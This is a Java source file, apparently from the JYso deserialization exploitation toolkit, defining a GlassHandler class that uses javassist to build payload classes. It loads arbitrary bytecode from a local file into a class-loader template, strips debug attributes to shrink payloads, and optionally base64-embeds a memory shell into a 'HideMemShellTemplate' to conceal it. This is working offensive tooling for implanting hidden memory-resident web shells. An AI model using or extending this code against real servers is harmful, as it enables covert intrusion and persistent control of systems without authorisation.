package com.qi4l.JYso.gadgets.utils.handle;

import com.qi4l.JYso.gadgets.Config.Config;
import com.qi4l.JYso.gadgets.utils.Utils;
import javassist.CtClass;
import javassist.bytecode.*;
import org.apache.commons.codec.binary.Base64;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;

public class GlassHandler {
    public static CtClass generateClass(String target) throws Exception {
        String newClassName = ClassNameHandler.generateClassName();
        CtClass ctClass = generateClass(target, newClassName);

        // 如果需要，保存类文件
        Utils.saveCtClassToFile(ctClass);
        return ctClass;
    }


    public static CtClass generateClass(String target, String newClassName) throws Exception {
        // 如果命令以 LF- 开头 （Local File），则程序可以生成一个能加载本地指定类字节码并初始化的逻辑，后面跟文件路径-类名
        if (target.startsWith("LF-")) {
            target = target.substring(3);
            String filePath = target.contains("-") ? target.split("-")[0] : target;
            CtClass ctClass = Config.POOL.makeClass(Files.newInputStream(Paths.get(filePath)));
            ctClass.setName(newClassName);

            // 对本地加载的类进行缩短操作
            shrinkBytes(ctClass);

            // 使用 ClassLoaderTemplate 进行加载
            return Utils.encapsulationByClassLoaderTemplate(ctClass.toBytecode());
        }

        return null;
    }

    public static CtClass generateClass(Class<?> clazz, String shellType, String newClassName) throws Exception {

        CtClass ctClass;
        byte[] byteCodes;

        String exClassName = clazz.getName();
        ctClass = Config.POOL.get(exClassName);

        // 为 DefineClassFromParameter 添加自定义函数功能
        ClassFieldHandler.insertFieldIfExists(ctClass, "parameter", "public static String parameter = " + ClassFieldHandler.converString(Config.PARAMETER) + ";");

        // 为类设置新的类名
        ctClass.setName(newClassName);

        shrinkBytes(ctClass);
        byteCodes = ctClass.toBytecode();

        if (Config.HIDE_MEMORY_SHELL) {
            switch (Config.HIDE_MEMORY_SHELL_TYPE) {
                case 1:
                    break;
                case 2:
                    CtClass newClass = Config.POOL.get("com.qi4l.JYso.template.HideMemShellTemplate");
                    newClass.setName(ClassNameHandler.generateClassName());
                    String content = "b64=\"" + Base64.encodeBase64String(byteCodes) + "\";";
                    String cName = "className=\"" + ctClass.getName() + "\";";
                    newClass.defrost();
                    newClass.makeClassInitializer().insertBefore(content);
                    newClass.makeClassInitializer().insertBefore(cName);

                    ctClass = newClass;
                    break;
            }
        }

        return ctClass;
    }


    // 统一处理，删除一些不影响使用的 Attribute 降低类字节码的大小
    public static void shrinkBytes(CtClass ctClass) {
        ClassFile classFile = ctClass.getClassFile2();
        classFile.removeAttribute(SourceFileAttribute.tag);
        classFile.removeAttribute(LineNumberAttribute.tag);
        classFile.removeAttribute(LocalVariableAttribute.tag);
        classFile.removeAttribute(LocalVariableAttribute.typeTag);
        classFile.removeAttribute(DeprecatedAttribute.tag);
        classFile.removeAttribute(SignatureAttribute.tag);
        classFile.removeAttribute(StackMapTable.tag);

        List<MethodInfo> list = classFile.getMethods();
        for (MethodInfo info : list) {
            info.removeAttribute("RuntimeVisibleAnnotations");
            info.removeAttribute("RuntimeInvisibleAnnotations");
        }
    }
}
